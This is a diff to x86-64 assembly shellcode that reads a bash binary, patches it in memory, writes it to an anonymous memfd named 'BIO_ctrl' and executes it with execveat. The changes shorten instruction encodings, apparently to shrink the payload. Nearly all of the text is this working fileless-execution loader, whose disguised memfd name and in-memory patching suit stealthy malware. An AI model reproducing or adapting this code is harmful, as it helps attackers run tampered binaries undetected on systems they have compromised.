@@ -157,13 +157,13 @@ _open_bin:
     xor rdx, rdx
     xor rsi, rsi
     lea rdi, [rel _str_bash]
-    mov rax, SYS_open
+    lea eax, [ecx + SYS_open]
     syscall
 
     mov rdx, STACKSPACE
     mov rsi, rsp
     mov rdi, rax
-    mov rax, SYS_read
+    lea eax, [ebx + SYS_read]
     syscall
     mov r12, rax
 
@@ -177,7 +177,6 @@ _discover_main:
     movsxd rax, [rax]
     add rax, main_rip_offset
     add r13, rax
-
 
 ;; Looking for .dynamic.
 ; Assumptions:
@@ -311,7 +310,7 @@ _apply_patches:
 _setup_memfd:
     xor rsi, rsi
     lea rdi, [rel _str_BIO_ctrl]
-    mov rax, SYS_memfd_create
+    mov eax, SYS_memfd_create
     syscall
 
 _write_memfd:
@@ -319,7 +318,7 @@ _write_memfd:
     mov r12, rax
     mov rsi, rsp
     mov rdi, rax
-    mov rax, SYS_write
+    mov eax, SYS_write
     syscall
 
 _execve_memfd:
@@ -328,7 +327,7 @@ _execve_memfd:
     xor rdx, rdx
     lea rsi, [rel _str_null]
     mov rdi, r12
-    mov rax, SYS_execveat
+    mov eax, SYS_execveat
     syscall
 
 ; end of the line
@@ -411,7 +410,8 @@ read_twice:
     mov rsi, rsp
 
     mov al, 1
-    mov rdi, rax
+    mov edi, eax
+    ; mov edi, eax
     syscall
 
 _inf:
